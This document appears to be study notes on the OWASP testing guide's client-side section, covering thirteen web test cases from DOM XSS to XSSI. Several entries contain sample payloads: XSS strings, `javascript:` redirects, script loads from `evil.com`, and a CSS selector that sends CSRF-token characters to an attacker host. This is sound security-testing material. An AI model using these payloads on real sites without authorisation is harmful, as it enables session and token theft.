# 4.11 Client-Side Testing (WSTG-CLNT)

Source: WSTG v4.2 §4.11. Attacks that live in the browser: DOM sources→sinks, redirects, CSS/resource abuse, CORS, Flash-era leftovers, framing, sockets/messaging, storage, and script-inclusion leaks. DevTools + a proxy are the lab.

## Test list

- **WSTG-CLNT-01 — DOM-based XSS.** Objective: find attacker-controlled sources reaching executable sinks. Procedure: inventory sources (`location.hash`, `location.search`, `referrer`, `postMessage`, storage) and sinks (`document.write`, `innerHTML`, `eval`, `setTimeout`/`setInterval` strings, `location` assignment, `element.src`); trace each source→sink path in JS (top-down testing is often the only viable route on framework-heavy apps); payloads in fragments (`#<script>…`) never reach the server — WAF/blind-spot. Interpretation: source reaching a dangerous sink unsanitized = DOM XSS with full reflected-XSS impact.
- **WSTG-CLNT-02 — JavaScript execution.** Objective: inject JS that runs via app logic (a DOM-XSS subtype). Procedure: look for user input consumed by `eval`, `window.location` assignment, or JSON-ish parsing — e.g., `var cc=eval('('+aMess+')')` fed by `location.hash`; inject `javascript:alert(1)`-style values or object literals that alter execution. Interpretation: arbitrary script execution in the victim's context = same severity as any XSS.
- **WSTG-CLNT-03 — HTML injection.** Objective: inject markup that the page renders as trusted. Procedure: target `innerHTML`/`document.write`/jQuery `html()`-style sinks fed by sources (`?user=<img src=x onerror=alert(1)>`); confirm browser parses your markup in-page. Interpretation: attacker-controlled HTML enables phishing overlays, content spoofing, and a bridge to script execution via event handlers.
- **WSTG-CLNT-04 — Client-side URL redirect.** Objective: find JS-driven open redirects. Procedure: grep JS for `location`/`window.location`/`href` assignments fed by input (often `location.hash`/`search`); try `?#www.malicious.site`, `//evil.com`, and `?#javascript:alert(document.cookie)` when the value lands unencoded. Interpretation: redirecting under the real domain's trust = phishing vector and, with `javascript:` schemes, direct XSS.
- **WSTG-CLNT-05 — CSS injection.** Objective: inject CSS that executes or leaks data. Procedure: find CSS contexts fed by input (inline `<style>` blocks, `cssText`, style attributes); legacy vectors (`expression()`, `-o-link`) for old browsers; modern data-theft vector — attribute selectors leaking values char-by-char: `input[name=csrf_token][value^=a]{background:url(//attacker/log?a)}` iterating the alphabet to reconstruct CSRF tokens or sensitive attribute values. Interpretation: style injection = UI redressing at minimum; selector-oracle leaks make it a real data channel.
- **WSTG-CLNT-06 — Client-side resource manipulation.** Objective: control URLs the page loads as resources. Procedure: hunt input-driven resource URLs — `script.src`, `iframe.src`, `embed`, `object`, XMLHttpRequest targets (`createCORSRequest('GET', location.hash.slice(1))`); inject `/#http://evil.com/js.js`-style values. Interpretation: script-src control = trivial XSS; XHR-URL control = cross-origin content injection.
- **WSTG-CLNT-07 — Cross-Origin Resource Sharing (CORS).** Objective: find over-permissive CORS configs. Procedure: send `Origin: https://attacker.example` and inspect `Access-Control-Allow-Origin` — reflected-origin echo, `*`, or subdomain/postfix matching are the fails; check `Access-Control-Allow-Credentials: true` (origin echo + credentials = read authenticated cross-origin data); audit allowed methods/headers via the preflight `OPTIONS` response. Interpretation: `*` alone on public APIs is usually acceptable; reflected-origin **with credentials** on authenticated endpoints = session-data theft.
- **WSTG-CLNT-08 — Cross-Site Flashing (XSF).** Objective: abuse Flash/ActionScript where still deployed. Procedure: decompile SWF (flare/ffddec/JPEXS); hunt `loadMovie*`, `getURL`, `ExternalInterface`, `GetVariable`/`SetVariable` sinks fed by FlashVars — open redirector (`trusted.swf?getURLValue=…`), HTML injection, cross-movie sandbox violations; note FlashPlayer-version mitigation table (asfunction/ExternalInterface/GetURL availability varies). Interpretation: legacy but still flagged in old estates — a FlashVar reaching `getURL` is an open redirect under the trusted domain.
- **WSTG-CLNT-09 — Clickjacking.** Objective: determine if sensitive pages are frameable. Procedure: build a test page `<iframe src="target">` — loads = unprotected; then audit defenses: `X-Frame-Options` (DENY/SAMEORIGIN), CSP `frame-ancestors`; bypass attempts — frame-busting JS (defeat via `sandbox` attr, double-framing, `onBeforeUnload` tricks), mobile/alternate site versions lacking protection, `ALLOW-FROM` gaps in old browsers. Interpretation: frameable + a meaningful one-click action (settings change, transfer, consent) = reportable; no sensitive action = informational.
- **WSTG-CLNT-10 — WebSockets.** Objective: apply the full web-test battery to the socket channel. Procedure: detect `ws://`/`wss://` in source and DevTools Network/ZAP WebSocket tab; test **origin validation** — connect from a foreign-origin client (accepted = CSWSH-like risk); check `wss://` (TLS) on anything sensitive; replay/fuzz messages (ZAP) for injection, authN/authZ (sockets don't inherit page auth automatically — test what each message is allowed to do). Interpretation: missing origin check or plaintext `ws://` carrying auth/session data = findings; treat every message type as an input vector.
- **WSTG-CLNT-11 — Web Messaging (postMessage).** Objective: audit cross-origin message handling. Procedure: find `addEventListener("message", …)` handlers — is `event.origin` validated (exact match, not `endsWith`/regex-bypassable)?; on the sender side, is `postMessage` called with `*` targetOrigin?; trace `event.data` into sinks (innerHTML, eval) — origin-checked or not, treat it as untrusted input. Interpretation: missing/weak origin check + sensitive data processing = cross-origin data injection/theft.
- **WSTG-CLNT-12 — Browser storage.** Objective: find sensitive data held client-side. Procedure: enumerate `localStorage`, `sessionStorage` (list all key/values via DevTools/console loop), IndexedDB (structured objects — look for `CryptoKey`s stored `extractable: true` that should be `false`), WebSQL leftovers, cookies; check for session tokens, auth data, or PII stored where any XSS reads them; audit code handling storage values for injection into sinks. Interpretation: secrets/tokens in web storage = one XSS away from theft; storage→sink paths are DOM-XSS candidates.
- **WSTG-CLNT-13 — Cross-Site Script Inclusion (XSSI).** Objective: leak authenticated data via `<script src>` inclusion cross-origin. Procedure: diff authenticated vs unauthenticated JS responses — dynamic responses carrying user data are candidates (JSONP especially); test leakage vehicles — global variables (`window.secret`), global function parameters, CSV-in-JS via charset tricks (`charset="UTF-16"` on the script tag), runtime-error leaks (old IE), prototype/`this` chains; then include the endpoint from an attacker page and read the leaked values. Interpretation: JS-returned sensitive data includable cross-origin = XSSI; JSONP endpoints are the usual suspects.

## Common findings

`location.hash` → `innerHTML` DOM XSS; reflected `Origin` + credentials in CORS; `postMessage` handlers with no `event.origin` check; frameable settings/password pages (no `frame-ancestors`); tokens in localStorage; JSONP endpoints leaking PII cross-origin; `ws://` plaintext with auth data.

## Escalation notes

DOM XSS + missing HttpOnly = session theft (SESS-02/09); CORS credentials-echo = read any authenticated endpoint cross-origin; XSSI/JSONP = silent PII harvesting; clickjacking + CSRF absence (SESS-05) = forced actions; storage leaks hand attackers tokens for BUSL/ATHZ abuse. Frame findings as "user's data/actions exposed cross-origin," not "header missing."
